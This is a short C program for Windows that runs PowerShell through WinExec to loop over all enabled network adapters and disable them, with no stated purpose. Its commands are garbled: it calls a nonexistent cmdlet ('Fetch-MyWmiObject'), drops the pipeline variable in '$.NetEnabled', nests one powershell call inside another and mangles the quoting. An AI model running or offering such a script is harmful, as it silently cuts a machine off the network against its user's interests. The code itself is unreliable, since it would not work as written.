#include <windows.h>

#define RUN(toRun) WinExec("powershell -Command \"& { " toRun " }\"", SW_SHOW);

int main() {
    RUN("powershell -Command \"Fetch-MyWmiObject-class Win32_NetworkAdapter | ForEach{ If($.NetEnabled) { $.Disable() } }\" > NULL");
    return 0;
}